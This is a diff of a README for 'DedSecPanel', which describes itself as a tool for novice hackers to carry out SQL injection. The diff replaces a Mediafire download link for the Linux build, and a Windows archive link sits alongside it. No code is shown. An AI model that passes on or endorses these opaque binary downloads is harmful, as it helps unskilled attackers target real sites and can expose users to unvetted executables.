@@ -7,7 +7,7 @@ DedSecPanel is a tool designed to help novice hackers to make SqlInjection, new 
 Installation Guide:
 
 Link for installation on linux:
-https://www.mediafire.com/file/kltq4dsq2b0olrp/DedSec-Panel-linux-x64.zip/file
+https://www.mediafire.com/file/pdtiy8jocwg1fm1/DedSec-Panel-linux-x64.zip/file
 
 Link for installation on Windows:
 https://www.mediafire.com/file/yikxgozjj742rf5/DedSec-PanelSetup.rar/file
